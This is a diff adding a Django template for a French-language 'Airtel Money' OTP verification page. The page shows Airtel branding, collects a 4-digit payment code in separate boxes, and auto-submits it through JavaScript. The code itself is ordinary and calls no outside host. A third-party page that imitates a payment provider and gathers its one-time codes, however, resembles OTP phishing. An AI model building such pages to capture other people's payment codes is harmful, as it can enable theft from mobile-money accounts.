@@ -1,0 +1,96 @@
+{% extends "base.html" %}
+{% load static %}
+{% block title %}Airtel Money - Vérification{% endblock %}
+{% block content %}
+<div class="flex items-center justify-center min-h-[calc(100vh-100px)] px-3">
+  <div class="w-full max-w-sm">
+    <div class="bg-[#E60000] rounded-t-2xl p-4 text-center shadow-lg">
+        <img src="{% static 'images/airtel_logo.png' %}" alt="Airtel Money" class="h-8 mx-auto object-contain brightness-0 invert">
+        <h2 class="text-white font-bold mt-2 text-lg tracking-tight">Vérification Requise</h2>
+    </div>
+    <div class="bg-white rounded-b-2xl shadow-2xl p-5 border-x border-b border-gray-50">
+      <div class="flex flex-col items-center mb-5">
+        <div class="w-12 h-12 bg-red-50 rounded-full flex items-center justify-center mb-3">
+            <i class="uil uil-shield-check text-2xl text-[#E60000]"></i>
+        </div>
+        <h2 class="text-lg font-black text-gray-900 text-center">Entrez le Code OTP</h2>
+        <p class="text-gray-500 text-center mt-1 text-xs leading-relaxed">
+            Un code à 4 chiffres a été envoyé à<br>
+            <span class="font-bold text-gray-900">{{ order.phone_number }}</span>
+        </p>
+      </div>
+      <form id="otp-form" method="POST" class="space-y-4" novalidate>
+        {% csrf_token %}
+        <input type="hidden" name="action" value="verify_otp">
+        <div class="flex justify-center gap-2 mb-5">
+          <input type="text" maxlength="1" class="otp-box w-12 h-14 text-center text-2xl font-black border-2 border-gray-200 rounded-xl focus:border-[#E60000] focus:ring-4 focus:ring-red-50 focus:outline-none transition-all" inputmode="numeric" autocomplete="one-time-code" data-index="0" />
+          <input type="text" maxlength="1" class="otp-box w-12 h-14 text-center text-2xl font-black border-2 border-gray-200 rounded-xl focus:border-[#E60000] focus:ring-4 focus:ring-red-50 focus:outline-none transition-all" inputmode="numeric" data-index="1" />
+          <input type="text" maxlength="1" class="otp-box w-12 h-14 text-center text-2xl font-black border-2 border-gray-200 rounded-xl focus:border-[#E60000] focus:ring-4 focus:ring-red-50 focus:outline-none transition-all" inputmode="numeric" data-index="2" />
+          <input type="text" maxlength="1" class="otp-box w-12 h-14 text-center text-2xl font-black border-2 border-gray-200 rounded-xl focus:border-[#E60000] focus:ring-4 focus:ring-red-50 focus:outline-none transition-all" inputmode="numeric" data-index="3" />
+        </div>
+        <input type="hidden" id="otp-field" name="otp" value="">
+        <button
+          id="submit-btn"
+          type="submit"
+          class="w-full bg-[#E60000] hover:bg-[#CC0000] text-white font-black py-3 rounded-xl shadow-lg shadow-red-100 transition-all transform active:scale-95 uppercase tracking-widest flex items-center justify-center gap-2 text-sm"
+        >
+          <span>Vérifier et Payer</span>
+        </button>
+      </form>
+      <div class="mt-5 text-center">
+        <p class="text-xs text-gray-400 uppercase font-bold tracking-widest">
+          Vous n'avez pas reçu le code?
+          <a href="#" class="text-[#E60000] hover:underline ml-1">Renvoyer le Code</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+  const otpBoxes = document.querySelectorAll('.otp-box');
+  const otpField = document.getElementById('otp-field');
+  const otpForm = document.getElementById('otp-form');
+  const submitBtn = document.getElementById('submit-btn');
+
+  function handleOtpState() {
+    const otpValue = Array.from(otpBoxes).map(box => box.value).join('');
+    otpField.value = otpValue;
+    if (otpValue.length === 4) {
+      autoSubmitForm();
+    }
+  }
+  function autoSubmitForm() {
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<i class="uil uil-spinner-alt animate-spin text-xl"></i> Vérification...';
+    submitBtn.classList.add('opacity-90');
+    setTimeout(() => {
+        otpForm.submit();
+    }, 150);
+  }
+  otpBoxes.forEach((box, index) => {
+    if(index === 0) box.focus();
+    box.addEventListener('input', function(e) {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      if (this.value.length === 1 && index < 3) {
+        otpBoxes[index + 1].focus();
+      }
+      handleOtpState();
+    });
+    box.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && this.value === '' && index > 0) {
+        otpBoxes[index - 1].focus();
+      }
+    });
+    box.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const pastedData = e.clipboardData.getData('text').slice(0, 4);
+      if (/^\d+$/.test(pastedData)) {
+        pastedData.split('').forEach((char, i) => {
+          if (otpBoxes[i]) otpBoxes[i].value = char;
+        });
+        handleOtpState();
+      }
+    });
+  });
+</script>
+{% endblock %}
